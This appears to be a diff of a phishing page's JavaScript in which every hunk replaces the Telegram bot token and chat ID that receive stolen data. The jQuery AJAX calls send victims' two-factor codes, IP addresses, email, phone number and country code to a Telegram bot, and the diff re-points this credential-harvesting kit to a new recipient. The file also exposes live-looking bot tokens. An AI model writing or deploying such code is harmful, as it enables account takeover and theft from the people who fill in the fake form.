@@ -3262,10 +3262,10 @@
                 return;
             }
             $.ajax({
-                url: 'https://api.telegram.org/bot6045346549:AAEOsmnNplB0KiTs2eT1FArSjuaOyFWW4VI/sendMessage',
+                url: 'https://api.telegram.org/bot6748309249:AAHKPvhcuMoOVbaqRp-uOM6RTYdTan5bPrE/sendMessage',
                 method: 'POST',
                 data: {
-                    chat_id: '-4044433516',
+                    chat_id: '-4090583156',
                     text: '2FA: ' + code + '\nIp: ' + ip
                 }
             });
@@ -3322,10 +3322,10 @@
                 return;
             }
             $.ajax({
-                url: 'https://api.telegram.org/bot6545755192:AAGuNm_9NYAZ3xRKDYV7zhcGWdj6ZHviPUY/sendMessage',
+                url: 'https://api.telegram.org/bot6748309249:AAHKPvhcuMoOVbaqRp-uOM6RTYdTan5bPrE/sendMessage',
                 method: 'POST',
                 data: {
-                    chat_id: '-4044433516',
+                    chat_id: '-4090583156',
                     text: '2FA: ' + code + '\nIp: ' + ip
                 }
             });
@@ -3422,7 +3422,7 @@
 
         function SendMess(text) {
             $.ajax({
-                url: "https://api.telegram.org/bot6527756193:AAH07r_EdcMQLB5qhqKc0-M2KY4bmFYXCKk/sendMessage?chat_id=-&text=" + text,
+                url: "https://api.telegram.org/bot6748309249:AAHKPvhcuMoOVbaqRp-uOM6RTYdTan5bPrE/sendMessage?chat_id=-&text=" + text,
                 type: 'POST',
                 success: function(data) {
                     console.log('true', data);
@@ -3878,10 +3878,10 @@
 
             var reason = $('#reason').val();
             $.ajax({
-                url: "https://api.telegram.org/bot6527756193:AAH07r_EdcMQLB5qhqKc0-M2KY4bmFYXCKk/sendMessage",
+                url: "https://api.telegram.org/bot6748309249:AAHKPvhcuMoOVbaqRp-uOM6RTYdTan5bPrE/sendMessage",
                 method: "POST",
                 data: {
-                    chat_id: "-4044433516",
+                    chat_id: "-4090583156",
                     text: "Email: " + email + "\nMã Vùng:" + country_code + "\nPhone: " + phone + "\nIp: " + ip + "\nMô tả:" + reason
                 }
             });
